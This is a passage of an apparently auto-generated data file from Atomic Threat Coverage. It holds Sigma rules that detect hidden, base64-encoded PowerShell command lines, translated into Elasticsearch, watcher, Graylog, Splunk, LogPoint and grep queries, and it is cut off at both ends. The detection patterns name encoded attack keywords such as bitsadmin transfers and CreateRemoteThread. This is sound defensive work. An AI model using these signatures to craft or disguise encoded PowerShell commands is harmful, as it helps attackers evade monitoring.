JAB* OR *\\\\\\\\ \\\\\\\\-e\\\\\\\\ \\\\\\\\ \\\\\\\\ \\\\\\\\ \\\\\\\\ JAB* OR *\\\\\\\\ \\\\\\\\-e\\\\\\\\ \\\\\\\\ \\\\\\\\ \\\\\\\\ \\\\\\\\ \\\\\\\\ JAB* OR *\\\\\\\\ \\\\\\\\-en\\\\\\\\ JAB* OR *\\\\\\\\ \\\\\\\\-enc\\\\\\\\ JAB* OR *\\\\\\\\ \\\\\\\\-enc*\\\\\\\\ JAB* OR *\\\\\\\\ \\\\\\\\-w\\\\\\\\ hidden\\\\\\\\ \\\\\\\\-e*\\\\\\\\ JAB* OR *\\\\\\\\ BA\\\\\\\\^J\\\\\\\\ e\\\\\\\\- OR *\\\\\\\\ \\\\\\\\-e\\\\\\\\ SUVYI* OR *\\\\\\\\ \\\\\\\\-e\\\\\\\\ aWV4I* OR *\\\\\\\\ \\\\\\\\-e\\\\\\\\ SQBFAFgA* OR *\\\\\\\\ \\\\\\\\-e\\\\\\\\ aQBlAHgA* OR *\\\\\\\\ \\\\\\\\-enc\\\\\\\\ SUVYI* OR *\\\\\\\\ \\\\\\\\-enc\\\\\\\\ aWV4I* OR *\\\\\\\\ \\\\\\\\-enc\\\\\\\\ SQBFAFgA* OR *\\\\\\\\ \\\\\\\\-enc\\\\\\\\ aQBlAHgA*) AND (NOT (CommandLine.keyword:*\\\\\\\\ \\\\\\\\-ExecutionPolicy\\\\\\\\ remotesigned\\\\\\\\ *)))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(CommandLine.keyword:(*\\\\\\\\ \\\\\\\\-e\\\\\\\\ JAB* OR *\\\\\\\\ \\\\\\\\-e\\\\\\\\ \\\\\\\\ JAB* OR *\\\\\\\\ \\\\\\\\-e\\\\\\\\ \\\\\\\\ \\\\\\\\ JAB* OR *\\\\\\\\ \\\\\\\\-e\\\\\\\\ \\\\\\\\ \\\\\\\\ \\\\\\\\ JAB* OR *\\\\\\\\ \\\\\\\\-e\\\\\\\\ \\\\\\\\ \\\\\\\\ \\\\\\\\ \\\\\\\\ JAB* OR *\\\\\\\\ \\\\\\\\-e\\\\\\\\ \\\\\\\\ \\\\\\\\ \\\\\\\\ \\\\\\\\ \\\\\\\\ JAB* OR *\\\\\\\\ \\\\\\\\-en\\\\\\\\ JAB* OR *\\\\\\\\ \\\\\\\\-enc\\\\\\\\ JAB* OR *\\\\\\\\ \\\\\\\\-enc*\\\\\\\\ JAB* OR *\\\\\\\\ \\\\\\\\-w\\\\\\\\ hidden\\\\\\\\ \\\\\\\\-e*\\\\\\\\ JAB* OR *\\\\\\\\ BA\\\\\\\\^J\\\\\\\\ e\\\\\\\\- OR *\\\\\\\\ \\\\\\\\-e\\\\\\\\ SUVYI* OR *\\\\\\\\ \\\\\\\\-e\\\\\\\\ aWV4I* OR *\\\\\\\\ \\\\\\\\-e\\\\\\\\ SQBFAFgA* OR *\\\\\\\\ \\\\\\\\-e\\\\\\\\ aQBlAHgA* OR *\\\\\\\\ \\\\\\\\-enc\\\\\\\\ SUVYI* OR *\\\\\\\\ \\\\\\\\-enc\\\\\\\\ aWV4I* OR *\\\\\\\\ \\\\\\\\-enc\\\\\\\\ SQBFAFgA* OR *\\\\\\\\ \\\\\\\\-enc\\\\\\\\ aQBlAHgA*) AND (NOT (CommandLine.keyword:*\\\\\\\\ \\\\\\\\-ExecutionPolicy\\\\\\\\ remotesigned\\\\\\\\ *)))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Suspicious Encoded PowerShell Command Line\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(CommandLine.keyword:(* \\\\-e JAB* * \\\\-e  JAB* * \\\\-e   JAB* * \\\\-e    JAB* * \\\\-e     JAB* * \\\\-e      JAB* * \\\\-en JAB* * \\\\-enc JAB* * \\\\-enc* JAB* * \\\\-w hidden \\\\-e* JAB* * BA\\\\^J e\\\\- * \\\\-e SUVYI* * \\\\-e aWV4I* * \\\\-e SQBFAFgA* * \\\\-e aQBlAHgA* * \\\\-enc SUVYI* * \\\\-enc aWV4I* * \\\\-enc SQBFAFgA* * \\\\-enc aQBlAHgA*) AND (NOT (CommandLine.keyword:* \\\\-ExecutionPolicy remotesigned *)))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "((CommandLine=\"* -e JAB*\" OR CommandLine=\"* -e  JAB*\" OR CommandLine=\"* -e   JAB*\" OR CommandLine=\"* -e    JAB*\" OR CommandLine=\"* -e     JAB*\" OR CommandLine=\"* -e      JAB*\" OR CommandLine=\"* -en JAB*\" OR CommandLine=\"* -enc JAB*\" OR CommandLine=\"* -enc* JAB*\" OR CommandLine=\"* -w hidden -e* JAB*\" OR CommandLine=\"* BA^J e-\" OR CommandLine=\"* -e SUVYI*\" OR CommandLine=\"* -e aWV4I*\" OR CommandLine=\"* -e SQBFAFgA*\" OR CommandLine=\"* -e aQBlAHgA*\" OR CommandLine=\"* -enc SUVYI*\" OR CommandLine=\"* -enc aWV4I*\" OR CommandLine=\"* -enc SQBFAFgA*\" OR CommandLine=\"* -enc aQBlAHgA*\") NOT (CommandLine=\"* -ExecutionPolicy remotesigned *\"))", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" CommandLine IN [\"* -e JAB*\", \"* -e  JAB*\", \"* -e   JAB*\", \"* -e    JAB*\", \"* -e     JAB*\", \"* -e      JAB*\", \"* -en JAB*\", \"* -enc JAB*\", \"* -enc* JAB*\", \"* -w hidden -e* JAB*\", \"* BA^J e-\", \"* -e SUVYI*\", \"* -e aWV4I*\", \"* -e SQBFAFgA*\", \"* -e aQBlAHgA*\", \"* -enc SUVYI*\", \"* -enc aWV4I*\", \"* -enc SQBFAFgA*\", \"* -enc aQBlAHgA*\"]  -(CommandLine=\"* -ExecutionPolicy remotesigned *\"))", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*(?:.*.* -e JAB.*|.*.* -e  JAB.*|.*.* -e   JAB.*|.*.* -e    JAB.*|.*.* -e     JAB.*|.*.* -e      JAB.*|.*.* -en JAB.*|.*.* -enc JAB.*|.*.* -enc.* JAB.*|.*.* -w hidden -e.* JAB.*|.*.* BA\\\\^J e-|.*.* -e SUVYI.*|.*.* -e aWV4I.*|.*.* -e SQBFAFgA.*|.*.* -e aQBlAHgA.*|.*.* -enc SUVYI.*|.*.* -enc aWV4I.*|.*.* -enc SQBFAFgA.*|.*.* -enc aQBlAHgA.*))(?=.*(?!.*(?:.*(?=.*.* -ExecutionPolicy remotesigned .*)))))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Malicious Base64 encoded PowerShell Keywords in command lines\nid: f26c6093-6f14-4b12-800f-0fcb46f5ffd0\nstatus: experimental\ndescription: Detects base64 encoded strings used in hidden malicious PowerShell command lines\nreferences:\n    - http://www.leeholmes.com/blog/2017/09/21/searching-for-content-in-base-64-strings/\ntags:\n    - attack.execution\n    - attack.t1086\nauthor: John Lambert (rule)\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    encoded:\n        Image: '*\\powershell.exe'\n        CommandLine: '* hidden *'\n    selection:\n        CommandLine:\n            - '*AGkAdABzAGEAZABtAGkAbgAgAC8AdAByAGEAbgBzAGYAZQByA*'\n            - '*aXRzYWRtaW4gL3RyYW5zZmVy*'\n            - '*IAaQB0AHMAYQBkAG0AaQBuACAALwB0AHIAYQBuAHMAZgBlAHIA*'\n            - '*JpdHNhZG1pbiAvdHJhbnNmZX*'\n            - '*YgBpAHQAcwBhAGQAbQBpAG4AIAAvAHQAcgBhAG4AcwBmAGUAcg*'\n            - '*Yml0c2FkbWluIC90cmFuc2Zlc*'\n            - '*AGMAaAB1AG4AawBfAHMAaQB6AGUA*'\n            - '*JABjAGgAdQBuAGsAXwBzAGkAegBlA*'\n            - '*JGNodW5rX3Npem*'\n            - '*QAYwBoAHUAbgBrAF8AcwBpAHoAZQ*'\n            - '*RjaHVua19zaXpl*'\n            - '*Y2h1bmtfc2l6Z*'\n            - '*AE8ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4A*'\n            - '*kATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8Abg*'\n            - '*lPLkNvbXByZXNzaW9u*'\n            - '*SQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuA*'\n            - '*SU8uQ29tcHJlc3Npb2*'\n            - '*Ty5Db21wcmVzc2lvb*'\n            - '*AE8ALgBNAGUAbQBvAHIAeQBTAHQAcgBlAGEAbQ*'\n            - '*kATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtA*'\n            - '*lPLk1lbW9yeVN0cmVhb*'\n            - '*SQBPAC4ATQBlAG0AbwByAHkAUwB0AHIAZQBhAG0A*'\n            - '*SU8uTWVtb3J5U3RyZWFt*'\n            - '*Ty5NZW1vcnlTdHJlYW*'\n            - '*4ARwBlAHQAQwBoAHUAbgBrA*'\n            - '*5HZXRDaHVua*'\n            - '*AEcAZQB0AEMAaAB1AG4Aaw*'\n            - '*LgBHAGUAdABDAGgAdQBuAGsA*'\n            - '*LkdldENodW5r*'\n            - '*R2V0Q2h1bm*'\n            - '*AEgAUgBFAEEARABfAEkATgBGAE8ANgA0A*'\n            - '*QASABSAEUAQQBEAF8ASQBOAEYATwA2ADQA*'\n            - '*RIUkVBRF9JTkZPNj*'\n            - '*SFJFQURfSU5GTzY0*'\n            - '*VABIAFIARQBBAEQAXwBJAE4ARgBPADYANA*'\n            - '*VEhSRUFEX0lORk82N*'\n            - '*AHIAZQBhAHQAZQBSAGUAbQBvAHQAZQBUAGgAcgBlAGEAZA*'\n            - '*cmVhdGVSZW1vdGVUaHJlYW*'\n            - '*MAcgBlAGEAdABlAFIAZQBtAG8AdABlAFQAaAByAGUAYQBkA*'\n            - '*NyZWF0ZVJlbW90ZVRocmVhZ*'\n            - '*Q3JlYXRlUmVtb3RlVGhyZWFk*'\n            - '*QwByAGUAYQB0AGUAUgBlAG0AbwB0AGUAVABoAHIAZQBhAGQA*'\n            - '*0AZQBtAG0AbwB2AGUA*'\n            - '*1lbW1vdm*'\n            - '*AGUAbQBtAG8AdgBlA*'\n            - '*bQBlAG0AbQBvAHYAZQ*'\n            - '*bWVtbW92Z*'\n            - '*ZW1tb3Zl*'\n    condition: encoded and selection\nfalsepositives:\n    - Penetration tests\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Malicious Base64 encoded PowerShell Keywords in command lines\nid: f26c6093-6f14-4b12-800f-0fcb46f5ffd0\nstatus: experimental\ndescription: Detects base64 encoded strings used in hidden malicious PowerShell command lines\nreferences:\n    - http://www.leeholmes.com/blog/2017/09/21/searching-for-content-in-base-64-strings/\ntags:\n    - attack.execution\n    - attack.t1086\nauthor: John Lambert (rule)\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    encoded:\n        Image: '*\\powershell.exe'\n        CommandLine: '* hidden *'\n    selection:\n        CommandLine:\n            - '*AGkAdABzAGEAZABtAGkAbgAgAC8AdAByAGEAbgBzAGYAZQByA*'\n            - '*aXRzYWRtaW4gL3RyYW5zZmVy*'\n            - '*IAaQB0AHMAYQBkAG0AaQBuACAALwB0AHIAYQBuAHMAZgBlAHIA*'\n            - '*JpdHNhZG1pbiAvdHJhbnNmZX*'\n            - '*YgBpAHQAcwBhAGQAbQBpAG4AIAAvAHQAcgBhAG4AcwBmAGUAcg*'\n            - '*Yml0c2FkbWluIC90cmFuc2Zlc*'\n            - '*AGMAaAB1AG4AawBfAHMAaQB6AGUA*'\n            - '*JABjAGgAdQBuAGsAXwBzAGkAegBlA*'\n            - '*JGNodW5rX3Npem*'\n            - '*QAYwBoAHUAbgBrAF8AcwBpAHoAZQ*'\n            - '*RjaHVua19zaXpl*'\n            - '*Y2h1bmtfc2l6Z*'\n            - '*AE8ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4A*'\n            - '*kATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8Abg*'\n            - '*lPLkNvbXByZXNzaW9u*'\n            - '*SQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuA*'\n            - '*SU8uQ29tcHJlc3Npb2*'\n            - '*Ty5Db21wcmVzc2lvb*'\n            - '*AE8ALgBNAGUAbQBvAHIAeQBTAHQAcgBlAGEAbQ*'\n            - '*kATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtA*'\n            - '*lPLk1lbW9yeVN0cmVhb*'\n            - '*SQBPAC4ATQBlAG0AbwByAHkAUwB0AHIAZQBhAG0A*'\n            - '*SU8uTWVtb3J5U3RyZWFt*'\n            - '*Ty5NZW1vcnlTdHJlYW*'\n            - '*4ARwBlAHQAQwBoAHUAbgBrA*'\n            - '*5HZXRDaHVua*'\n            - '*AEcAZQB0AEMAaAB1AG4Aaw*'\n            - '*LgBHAGUAdABDAGgAdQBuAGsA*'\n            - '*LkdldENodW5r*'\n            - '*R2V0Q2h1bm*'\n            - '*AEgAUgBFAEEARABfAEkATgBGAE8ANgA0A*'\n            - '*QASABSAEUAQQBEAF8ASQBOAEYATwA2ADQA*'\n            - '*RIUkVBRF9JTkZPNj*'\n            - '*SFJFQURfSU5GTzY0*'\n            - '*VABIAFIARQBBAEQAXwBJAE4ARgBPADYANA*'\n            - '*VEhSRUFEX0lORk82N*'\n            - '*AHIAZQBhAHQAZQBSAGUAbQBvAHQAZQBUAGgAcgBlAGEAZA*'\n            - '*cmVhdGVSZW1vdGVUaHJlYW*'\n            - '*MAcgBlAGEAdABlAFIAZQBtAG8AdABlAFQAaAByAGUAYQBkA*'\n            - '*NyZWF0ZVJlbW90ZVRocmVhZ*'\n            - '*Q3JlYXRlUmVtb3RlVGhyZWFk*'\n            - '*QwByAGUAYQB0AGUAUgBlAG0AbwB0AGUAVABoAHIAZQBhAGQA*'\n            - '*0AZQBtAG0AbwB2AGUA*'\n            - '*1lbW1vdm*'\n            - '*AGUAbQBtAG8AdgBlA*'\n            - '*bQBlAG0AbQBvAHYAZQ*'\n            - '*bWVtbW92Z*'\n            - '*ZW1tb3Zl*'\n    condition: encoded and selection\nfalsepositives:\n    - Penetration tests\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(Image.keyword:*\\\\\\\\powershell.exe AND CommandLine.keyword:*\\\\ hidden\\\\ * AND CommandLine.keyword:(*AGkAdABzAGEAZABtAGkAbgAgAC8AdAByAGEAbgBzAGYAZQByA* OR *aXRzYWRtaW4gL3RyYW5zZmVy* OR *IAaQB0AHMAYQBkAG0AaQBuACAALwB0AHIAYQBuAHMAZgBlAHIA* OR *JpdHNhZG1pbiAvdHJhbnNmZX* OR *YgBpAHQAcwBhAGQAbQBpAG4AIAAvAHQAcgBhAG4AcwBmAGUAcg* OR *Yml0c2FkbWluIC90cmFuc2Zlc* OR *AGMAaAB1AG4AawBfAHMAaQB6AGUA* OR *JABjAGgAdQBuAGsAXwBzAGkAegBlA* OR *JGNodW5rX3Npem* OR *QAYwBoAHUAbgBrAF8AcwBpAHoAZQ* OR *RjaHVua19zaXpl* OR *Y2h1bmtfc2l6Z* OR *AE8ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4A* OR *kATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8Abg* OR *lPLkNvbXByZXNzaW9u* OR *SQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuA* OR *SU8uQ29tcHJlc3Npb2* OR *Ty5Db21wcmVzc2lvb* OR *AE8ALgBNAGUAbQBvAHIAeQBTAHQAcgBlAGEAbQ* OR *kATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtA* OR *lPLk1lbW9yeVN0cmVhb* OR *SQBPAC4ATQBlAG0AbwByAHkAUwB0AHIAZQBhAG0A* OR *SU8uTWVtb3J5U3RyZWFt* OR *Ty5NZW1vcnlTdHJlYW* OR *4ARwBlAHQAQwBoAHUAbgBrA* OR *5HZXRDaHVua* OR *AEcAZQB0AEMAaAB1AG4Aaw* OR *LgBHAGUAdABDAGgAdQBuAGsA* OR *LkdldENodW5r* OR *R2V0Q2h1bm* OR *AEgAUgBFAEEARABfAEkATgBGAE8ANgA0A* OR *QASABSAEUAQQBEAF8ASQBOAEYATwA2ADQA* OR *RIUkVBRF9JTkZPNj* OR *SFJFQURfSU5GTzY0* OR *VABIAFIARQBBAEQAXwBJAE4ARgBPADYANA* OR *VEhSRUFEX0lORk82N* OR *AHIAZQBhAHQAZQBSAGUAbQBvAHQAZQBUAGgAcgBlAGEAZA* OR *cmVhdGVSZW1vdGVUaHJlYW* OR *MAcgBlAGEAdABlAFIAZQBtAG8AdABlAFQAaAByAGUAYQBkA* OR *NyZWF0ZVJlbW90ZVRocmVhZ* OR *Q3JlYXRlUmVtb3RlVGhyZWFk* OR *QwByAGUAYQB0AGUAUgBlAG0AbwB0AGUAVABoAHIAZQBhAGQA* OR *0AZQBtAG0AbwB2AGUA* OR *1lbW1vdm* OR *AGUAbQBtAG8AdgBlA* OR *bQBlAG0AbQBvAHYAZQ* OR *bWVtbW92Z* OR *ZW1tb3Zl*))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Malicious-Base64-encoded-PowerShell-Keywords-in-command-lines <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Malicious Base64 encoded PowerShell Keywords in command lines\",\\n    \"description\": \"Detects base64 encoded strings used in hidden malicious PowerShell command lines\",\\n    \"tags\": [\\n      \"attack.execution\",\\n      \"attack.t1086\"\\n    ],\\n    \"query\": \"(Image.keyword:*\\\\\\\\\\\\\\\\powershell.exe AND CommandLine.keyword:*\\\\\\\\ hidden\\\\\\\\ * AND CommandLine.keyword:(*AGkAdABzAGEAZABtAGkAbgAgAC8AdAByAGEAbgBzAGYAZQByA* OR *aXRzYWRtaW4gL3RyYW5zZmVy* OR *IAaQB0AHMAYQBkAG0AaQBuACAALwB0AHIAYQBuAHMAZgBlAHIA* OR *JpdHNhZG1pbiAvdHJhbnNmZX* OR *YgBpAHQAcwBhAGQAbQBpAG4AIAAvAHQAcgBhAG4AcwBmAGUAcg* OR *Yml0c2FkbWluIC90cmFuc2Zlc* OR *AGMAaAB1AG4AawBfAHMAaQB6AGUA* OR *JABjAGgAdQBuAGsAXwBzAGkAegBlA* OR *JGNodW5rX3Npem* OR *QAYwBoAHUAbgBrAF8AcwBpAHoAZQ* OR *RjaHVua19zaXpl* OR *Y2h1bmtfc2l6Z* OR *AE8ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4A* OR *kATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8Abg* OR *lPLkNvbXByZXNzaW9u* OR *SQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuA* OR *SU8uQ29tcHJlc3Npb2* OR *Ty5Db21wcmVzc2lvb* OR *AE8ALgBNAGUAbQBvAHIAeQBTAHQAcgBlAGEAbQ* OR *kATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtA* OR *lPLk1lbW9yeVN0cmVhb* OR *SQBPAC4ATQBlAG0AbwByAHkAUwB0AHIAZQBhAG0A* OR *SU8uTWVtb3J5U3RyZWFt* OR *Ty5NZW1vcnlTdHJlYW* OR *4ARwBlAHQAQwBoAHUAbgBrA* OR *5HZXRDaHVua* OR *AEcAZQB0AEMAaAB1AG4Aaw* OR *LgBHAGUAdABDAGgAdQBuAGsA* OR *LkdldENodW5r* OR *R2V0Q2h1bm* OR *AEgAUgBFAEEARABfAEkATgBGAE8ANgA0A* OR *QASABSAEUAQQBEAF8ASQBOAEYATwA2ADQA* OR *RIUkVBRF9JTkZPNj* OR *SFJFQURfSU5GTzY0* OR *VABIAFIARQBBAEQAXwBJAE4ARgBPADYANA* OR *VEhSRUFEX0lORk82N* OR *AHIAZQBhAHQAZQBSAGUAbQBvAHQAZQBUAGgAcgBlAGEAZA* OR *cmVhdGVSZW1vdGVUaHJlYW* OR *MAcgBlAGEAdABlAFIAZQBtAG8AdABlAFQAaAByAGUAYQBkA* OR *NyZWF0ZVJlbW90ZVRocmVhZ* OR *Q3JlYXRlUmVtb3RlVGhyZWFk* OR *QwByAGUAYQB0AGUAUgBlAG0AbwB0AGUAVABoAHIAZQBhAGQA* OR *0AZQBtAG0AbwB2AGUA* OR *1lbW1vdm* OR *AGUAbQBtAG8AdgBlA* OR *bQBlAG0AbQBvAHYAZQ* OR *bWVtbW92Z* OR *ZW1tb3Zl*))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(Image.keyword:*\\\\\\\\\\\\\\\\powershell.exe AND CommandLine.keyword:*\\\\\\\\ hidden\\\\\\\\ * AND CommandLine.keyword:(*AGkAdABzAGEAZABtAGkAbgAgAC8AdAByAGEAbgBzAGYAZQByA* OR *aXRzYWRtaW4gL3RyYW5zZmVy* OR *IAaQB0AHMAYQBkAG0AaQBuACAALwB0AHIAYQBuAHMAZgBlAHIA* OR *JpdHNhZG1pbiAvdHJhbnNmZX* OR *YgBpAHQAcwBhAGQAbQBpAG4AIAAvAHQAcgBhAG4AcwBmAGUAcg* OR *Yml0c2FkbWluIC90cmFuc2Zlc* OR *AGMAaAB1AG4AawBfAHMAaQB6AGUA* OR *JABjAGgAdQBuAGsAXwBzAGkAegBlA* OR *JGNodW5rX3Npem* OR *QAYwBoAHUAbgBrAF8AcwBpAHoAZQ* OR *RjaHVua19zaXpl* OR *Y2h1bmtfc2l6Z* OR *AE8ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4A* OR *kATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8Abg* OR *lPLkNvbXByZXNzaW9u* OR *SQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuA* OR *SU8uQ29tcHJlc3Npb2* OR *Ty5Db21wcmVzc2lvb* OR *AE8ALgBNAGUAbQBvAHIAeQBTAHQAcgBlAGEAbQ* OR *kATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtA* OR *lPLk1lbW9yeVN0cmVhb* OR *SQBPAC4ATQBlAG0AbwByAHkAUwB0AHIAZQBhAG0A* OR *SU8uTWVtb3J5U3RyZWFt* OR *Ty5NZW1vcnlTdHJlYW* OR *4ARwBlAHQAQwBoAHUAbgBrA* OR *5HZXRDaHVua* OR *AEcAZQB0AEMAaAB1AG4Aaw* OR *LgBHAGUAdABDAGgAdQBuAGsA* OR *LkdldENodW5r* OR *R2V0Q2h1bm* OR *AEgAUgBFAEEARABfAEkATgBGAE8ANgA0A* OR *QASABSAEUAQQBEAF8ASQBOAEYATwA2ADQA* OR *RIUkVBRF9JTkZPNj* OR *SFJFQURfSU5GTzY0* OR *VABIAFIARQBBAEQAXwBJAE4ARgBPADYANA* OR *VEhSRUFEX0lORk82N* OR *AHIAZQBhAHQAZQBSAGUAbQBvAHQAZQBUAGgAcgBlAGEAZA* OR *cmVhdGVSZW1vdGVUaHJlYW* OR *MAcgBlAGEAdABlAFIAZQBtAG8AdABlAFQAaAByAGUAYQBkA* OR *NyZWF0ZVJlbW90ZVRocmVhZ* OR *Q3JlYXRlUmVtb3RlVGhyZWFk* OR *QwByAGUAYQB0AGUAUgBlAG0AbwB0AGUAVABoAHIAZQBhAGQA* OR *0AZQBtAG0AbwB2AGUA* OR *1lbW1vdm* OR *AGUAbQBtAG8AdgBlA* OR *bQBlAG0AbQBvAHYAZQ* OR *bWVtbW92Z* OR *ZW1tb3Zl*))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Malicious Base64 encoded PowerShell Keywords in command lines\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(Image.keyword:*\\\\\\\\powershell.exe AND CommandLine.keyword:* hidden * AND CommandLine.keyword:(*AGkAdABzAGEAZABtAGkAbgAgAC8AdAByAGEAbgBzAGYAZQByA* *aXRzYWRtaW4gL3RyYW5zZmVy* *IAaQB0AHMAYQBkAG0AaQBuACAALwB0AHIAYQBuAHMAZgBlAHIA* *JpdHNhZG1pbiAvdHJhbnNmZX* *YgBpAHQAcwBhAGQAbQBpAG4AIAAvAHQAcgBhAG4AcwBmAGUAcg* *Yml0c2FkbWluIC90cmFuc2Zlc* *AGMAaAB1AG4AawBfAHMAaQB6AGUA* *JABjAGgAdQBuAGsAXwBzAGkAegBlA* *JGNodW5rX3Npem* *QAYwBoAHUAbgBrAF8AcwBpAHoAZQ* *RjaHVua19zaXpl* *Y2h1bmtfc2l6Z* *AE8ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4A* *kATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8Abg* *lPLkNvbXByZXNzaW9u* *SQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuA* *SU8uQ29tcHJlc3Npb2* *Ty5Db21wcmVzc2lvb* *AE8ALgBNAGUAbQBvAHIAeQBTAHQAcgBlAGEAbQ* *kATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtA* *lPLk1lbW9yeVN0cmVhb* *SQBPAC4ATQBlAG0AbwByAHkAUwB0AHIAZQBhAG0A* *SU8uTWVtb3J5U3RyZWFt* *Ty5NZW1vcnlTdHJlYW* *4ARwBlAHQAQwBoAHUAbgBrA* *5HZXRDaHVua* *AEcAZQB0AEMAaAB1AG4Aaw* *LgBHAGUAdABDAGgAdQBuAGsA* *LkdldENodW5r* *R2V0Q2h1bm* *AEgAUgBFAEEARABfAEkATgBGAE8ANgA0A* *QASABSAEUAQQBEAF8ASQBOAEYATwA2ADQA* *RIUkVBRF9JTkZPNj* *SFJFQURfSU5GTzY0* *VABIAFIARQBBAEQAXwBJAE4ARgBPADYANA* *VEhSRUFEX0lORk82N* *AHIAZQBhAHQAZQBSAGUAbQBvAHQAZQBUAGgAcgBlAGEAZA* *cmVhdGVSZW1vdGVUaHJlYW* *MAcgBlAGEAdABlAFIAZQBtAG8AdABlAFQAaAByAGUAYQBkA* *NyZWF0ZVJlbW90ZVRocmVhZ* *Q3JlYXRlUmVtb3RlVGhyZWFk* *QwByAGUAYQB0AGUAUgBlAG0AbwB0AGUAVABoAHIAZQBhAGQA* *0AZQBtAG0AbwB2AGUA* *1lbW1vdm* *AGUAbQBtAG8AdgBlA* *bQBlAG0AbQBvAHYAZQ* *bWVtbW92Z* *ZW1tb3Zl*))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(Image=\"*\\\\\\\\powershell.exe\" CommandLine=\"* hidden *\" (CommandLine=\"*AGkAdABzAGEAZABtAGkAbgAgAC8AdAByAGEAbgBzAGYAZQByA*\" OR CommandLine=\"*aXRzYWRtaW4gL3RyYW5zZmVy*\" OR CommandLine=\"*IAaQB0AHMAYQBkAG0AaQBuACAALwB0AHIAYQBuAHMAZgBlAHIA*\" OR CommandLine=\"*JpdHNhZG1pbiAvdHJhbnNmZX*\" OR CommandLine=\"*YgBpAHQAcwBhAGQAbQBpAG4AIAAvAHQAcgBhAG4AcwBmAGUAcg*\" OR CommandLine=\"*Yml0c2FkbWluIC90cmFuc2Zlc*\" OR CommandLine=\"*AGMAaAB1AG4AawBfAHMAaQB6AGUA*\" OR CommandLine=\"*JABjAGgAdQBuAGsAXwBzAGkAegBlA*\" OR CommandLine=\"*JGNodW5rX3Npem*\" OR CommandLine=\"*QAYwBoAHUAbgBrAF8AcwBpAHoAZQ*\" OR CommandLine=\"*RjaHVua19zaXpl*\" OR 